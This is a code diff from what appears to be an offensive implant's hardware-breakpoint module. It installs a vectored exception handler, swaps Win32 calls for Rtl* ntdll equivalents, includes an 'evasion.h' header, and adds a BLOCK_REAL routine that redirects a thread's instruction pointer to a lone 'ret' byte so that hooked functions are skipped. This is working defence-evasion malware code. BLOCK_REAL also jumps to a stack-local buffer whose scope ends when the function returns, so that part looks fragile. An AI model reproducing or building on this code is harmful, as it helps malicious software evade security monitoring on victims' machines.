@@ -1,11 +1,5 @@
 #include <common.h>
-
-typedef enum _DRX{
-	Dr0,
-	Dr1,
-	Dr2,
-	Dr3
-} DRX, *PDRX;
+#include <evasion.h>
 
 FUNC UINT64 SetDr7Bits(
     UINT64 CurrentDr7Register, 
@@ -225,20 +219,20 @@ FUNC BOOL InitHwbp(
 
 	// If 'g_CriticalSection' is not yet initialized
 	if ( Blackout().Hwbp.CriticalSection.DebugInfo == NULL ) {
-		Instance()->Win32.InitializeCriticalSection( &Blackout().Hwbp.CriticalSection );
+		Instance()->Win32.RtlInitializeCriticalSection( &Blackout().Hwbp.CriticalSection );
 	}
 
 	// If 'g_VectorHandler' is not yet initialized
 	if ( !Blackout().Hwbp.VectorHandle ) {
 		// Add 'VectorHandler' as the VEH function
-		if ( ( Blackout().Hwbp.VectorHandle = Instance()->Win32.AddVectoredExceptionHandler(1, (PVECTORED_EXCEPTION_HANDLER)&HwbpVectorHandler) ) == NULL) 
+		if ( ( Blackout().Hwbp.VectorHandle = Instance()->Win32.RtlAddVectoredExceptionHandler(1, (PVECTORED_EXCEPTION_HANDLER)&HwbpVectorHandler) ) == NULL) 
 			return;
 	}
 
 	return ( Blackout().Hwbp.VectorHandle && Blackout().Hwbp.CriticalSection.DebugInfo );
 }
 
-FUNC UninitHwbp(
+FUNC VOID UninitHwbp(
 	VOID
 ) {
 	BLACKOUT_INSTANCE
@@ -247,13 +241,24 @@ FUNC UninitHwbp(
 		RmvHwbp( i );
 	// If the critical section is initialized, delete it
 	if ( Blackout().Hwbp.CriticalSection.DebugInfo )
-		Instance()->Win32.DeleteCriticalSection( &Blackout().Hwbp.CriticalSection );
+		Instance()->Win32.RtlDeleteCriticalSection( &Blackout().Hwbp.CriticalSection );
 	// If VEH is registered, remove it
 	if ( Blackout().Hwbp.VectorHandle )
-		Instance()->Win32.RemoveVectoredExceptionHandler( Blackout().Hwbp.VectorHandle );
+		Instance()->Win32.RtlRemoveVectoredExceptionHandler( Blackout().Hwbp.VectorHandle );
 
 	// Cleanup the global variables
 	MmZero( &Blackout().Hwbp.CriticalSection, sizeof( CRITICAL_SECTION ) );
 	MmZero( &Blackout().Hwbp.DetourFunc, sizeof( Blackout().Hwbp.DetourFunc ));
 	Blackout().Hwbp.VectorHandle = NULL;
+}
+
+FUNC VOID BLOCK_REAL(
+	PCONTEXT pThreadCtx
+) {
+	BYTE ucRet[1] = { 0xc3 };
+#ifdef _WIN64
+	pThreadCtx->Rip = (ULONG_PTR)&ucRet;
+#elif _WIN32
+	pThreadCtx->Eip = (DWORD)&ucRet;
+#endif // _WIN64
 }
